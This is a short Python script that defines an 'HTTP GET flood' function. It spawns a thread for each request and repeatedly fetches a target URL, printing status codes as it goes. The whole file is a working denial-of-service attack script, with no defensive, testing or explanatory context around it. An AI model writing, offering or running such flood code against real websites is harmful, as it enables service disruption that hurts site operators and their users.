import requests
import threading
import time

def flood_http(target_url, request_count=100):
	print(f"[+] Starting HTTP GET flood on {target_url} with {request_count} requests...")

	def send_request():
		try:
			response = requests.get(target_url)
			print(f"[+] Status Code: {response.status_code}")
		except requests.exceptions.RequestException as e:
			print(f"[!] Error: {e}")

	threads = []
	for _ in range(request_count):
		t = threading.Thread(target=send_request)
		t.start()
		threads.append(t)
		time.sleep(0.01)

	for t in threads:
		t.join()

	print("[+] HTTP GET flood complete.")
